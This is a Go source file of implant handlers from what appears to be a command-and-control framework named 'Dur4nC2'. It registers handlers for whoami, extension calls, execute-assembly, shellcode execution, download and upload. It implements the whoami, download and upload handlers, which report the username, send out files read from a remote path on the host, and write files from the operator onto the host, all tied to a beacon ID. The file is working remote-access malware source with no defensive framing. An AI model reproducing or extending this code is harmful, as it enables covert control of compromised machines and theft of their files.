package handlers

import (
	_user "Dur4nC2/implant/modules/user"
	"Dur4nC2/implant/modules/utils"
	"Dur4nC2/misc/protobuf/commonpb"
	"Dur4nC2/misc/protobuf/implantpb"
	"fmt"
	"google.golang.org/protobuf/proto"
)

type ImplantHandler func(envelope *implantpb.Envelope) *implantpb.Envelope

func GetHandlers() map[uint32]ImplantHandler {
	return map[uint32]ImplantHandler{
		implantpb.MsgWhoamiReq:            getWhoamiHandler,
		implantpb.MsgRegisterExtensionReq: registerExtensionHandler,
		implantpb.MsgListExtensionReq:     listExtensionsHandler,
		implantpb.MsgCallExtensionReq:     callExtensionHandler,
		implantpb.MsgExecuteAssemblyReq:   executeAssemblyHandler,
		implantpb.MsgExecuteShellcodeReq:  executeShellcodeHandler,
		implantpb.MsgDownloadReq:          downloadHandler,
		implantpb.MsgUploadReq:            uploadHandler,
	}
}

// Cross-platform handlers
func getWhoamiHandler(envelopeReq *implantpb.Envelope) *implantpb.Envelope {
	fmt.Println("[implant] Executing GetWhoamiHandler")
	whoamiReq := &implantpb.WhoamiReq{}
	err := proto.Unmarshal(envelopeReq.Data, whoamiReq)

	username := _user.GetWhoami()

	whoamiResp := &implantpb.WhoamiResp{
		Whoami: &commonpb.Whoami{
			Username: username,
		},
		Response: &commonpb.Response{
			BeaconID: whoamiReq.Request.BeaconID,
			//TaskID:   whoamiReq.Request.TaskID,
		},
	}
	//
	whoamiRespData, err := proto.Marshal(whoamiResp)
	if err != nil {
		return &implantpb.Envelope{}
	}
	envelopeResp := &implantpb.Envelope{
		ID:   envelopeReq.ID,
		Type: implantpb.MsgWhoamiResp,
		Data: whoamiRespData,
	}
	return envelopeResp
}

func downloadHandler(envelopeReq *implantpb.Envelope) *implantpb.Envelope {
	fmt.Println("[implant] Executing downloadHandler")
	downloadReq := &implantpb.DownloadReq{}
	err := proto.Unmarshal(envelopeReq.Data, downloadReq)
	if err != nil {
		return nil
	}

	file, err := utils.Download(downloadReq.RemotePath)
	var downloadResp *implantpb.DownloadResp
	if err != nil {
		downloadResp = &implantpb.DownloadResp{
			File:      file,
			LocalPath: downloadReq.LocalPath,
			Response: &commonpb.Response{
				BeaconID: downloadReq.Request.BeaconID,
				Err:      err.Error(),
				//TaskID:   whoamiReq.Request.TaskID,
			},
		}
	} else {
		downloadResp = &implantpb.DownloadResp{
			File:      file,
			LocalPath: downloadReq.LocalPath,
			Response: &commonpb.Response{
				BeaconID: downloadReq.Request.BeaconID,
				//TaskID:   whoamiReq.Request.TaskID,
			},
		}
	}
	downloadRespData, err := proto.Marshal(downloadResp)
	if err != nil {
		return &implantpb.Envelope{}
	}
	envelopeResp := &implantpb.Envelope{
		ID:   envelopeReq.ID,
		Type: implantpb.MsgDownloadResp,
		Data: downloadRespData,
	}
	return envelopeResp
}

func uploadHandler(envelopeReq *implantpb.Envelope) *implantpb.Envelope {
	fmt.Println("[implant] Executing uploadHandler")
	uploadReq := &implantpb.UploadReq{}
	err := proto.Unmarshal(envelopeReq.Data, uploadReq)
	if err != nil {
		return nil
	}

	err = utils.Upload(uploadReq.Path, uploadReq.File)
	var uploadResp *implantpb.UploadResp
	if err != nil {
		uploadResp = &implantpb.UploadResp{
			Response: &commonpb.Response{
				BeaconID: uploadReq.Request.BeaconID,
				Err:      err.Error(),
				//TaskID:   whoamiReq.Request.TaskID,
			},
		}
	} else {
		uploadResp = &implantpb.UploadResp{
			Response: &commonpb.Response{
				BeaconID: uploadReq.Request.BeaconID,
				//TaskID:   whoamiReq.Request.TaskID,
			},
		}
	}

	//
	uploadRespData, err := proto.Marshal(uploadResp)
	if err != nil {
		return &implantpb.Envelope{}
	}
	envelopeResp := &implantpb.Envelope{
		ID:   envelopeReq.ID,
		Type: implantpb.MsgUploadResp,
		Data: uploadRespData,
	}
	return envelopeResp
}
